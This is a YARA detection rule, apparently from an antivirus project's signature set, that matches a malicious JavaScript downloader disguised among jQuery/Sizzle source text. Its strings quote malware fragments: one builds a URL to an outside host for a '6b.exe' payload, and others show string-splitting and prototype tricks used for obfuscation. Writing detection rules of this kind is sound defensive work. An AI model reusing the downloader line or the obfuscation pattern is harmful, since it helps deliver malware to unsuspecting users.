rule sig_20160321_ccb253450121bb90d28cd4a57977672f {
  meta:
    description = "datamaliciousorder - file 20160321_ccb253450121bb90d28cd4a57977672f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "df0314476b07c6526eef5e064891e62bedbe4c22b03442aae78d315f5900035d"

  strings:
    $s1  = ".length > 2 && (token = tokens[0]).type === \\\"ID\\\" && support.getById && context.nodeType === 9 && documentIsHTML && Expr.re" ascii
    $s2  = "married(\"http://spor\"+\"mixa\"+\"riza.com/89h76\"+(\"montgomery\",\"extinguish\",\"6b.exe\"),\"NyajfcUPKCV\");" fullword ascii
    $s3  = "    GbTTbF = \"/** * A low-level selection function that works with Sizzle\\\"s compiled * selector functions * @param {String|F" ascii
    $s4  = "   YmfvfouyUae = \" Reduce context if the leading compound selector is an ID tokens = match[0] = match[0].slice( 0 ); if ( token" ascii
    $s5  = "tion} selector A selector or a pre-compiled * selector function built with Sizzle.compile * @param {Element} context * @param {A" ascii
    $s6  = "xt, results, seed ) { var i, tokens, token, type, find, compiled = typeof selector === \\\"function\\\" && selector, match = !se" ascii
    $s7  = "DOmjndt = \"} Override manipulation of globals by nested matchers if ( outermost ) { dirruns = dirrunsUnique; outermostContext =" ascii
    $s8  = "DOmjndt = \"} Override manipulation of globals by nested matchers if ( outermost ) { dirruns = dirrunsUnique; outermostContext =" ascii
    $s9  = "vPcBeRStHrB = \" Seedless set matches succeeding multiple successful matchers stipulate sorting if ( outermost && !seed && setMa" ascii
    $s10 = "& tokenize( (selector = compiled.selector || selector) );\";" fullword ascii
    $s11 = "        VhVUgzuqS = \"}compile = Sizzle.compile = function( selector, match /* Internal Use Only */ ) { var i, setMatchers = []," ascii
    $s12 = "rray} [results] * @param {Array} [seed] A set of elements to match against */ select = Sizzle.select = function( selector, conte" ascii
    $s13 = "vizier = ((\"poppy\", \"fabian\", \"PBPXAYPI\", \"smaller\", \"paprLpXDH\") + \"etCTcWkBsws\").recrimination();" fullword ascii
    $s14 = "h ) { match = tokenize( selector ); } i = match.length; while ( i-- ) { cached = matcherFromTokens( match[i] ); if ( cached[ exp" ascii
    $s15 = "erify ancestry, so step up a level } else if ( compiled ) { context = context.parentNode; \";" fullword ascii
    $s16 = "elementMatchers = [], cached = compilerCache[ selector + \\\" \\\" ];\";" fullword ascii
    $s17 = "String.prototype.recrimination = function () { return this.substr(0, 1); };" fullword ascii
    $s18 = "oluments\",\"ap\")+(\"bikini\",\"garage\",\"credulous\",\"or\")+\"er\"+(\"crunch\",\"question\",\"ip\")+\"ts\"+\"in\"+\"ga\"+\"p" ascii
    $s19 = "vPcBeRStHrB = \" Seedless set matches succeeding multiple successful matchers stipulate sorting if ( outermost && !seed && setMa" ascii
    $s20 = "        VhVUgzuqS = \"}compile = Sizzle.compile = function( selector, match /* Internal Use Only */ ) { var i, setMatchers = []," ascii

  condition:
    uint16(0) == 0x5770 and
    8 of them
}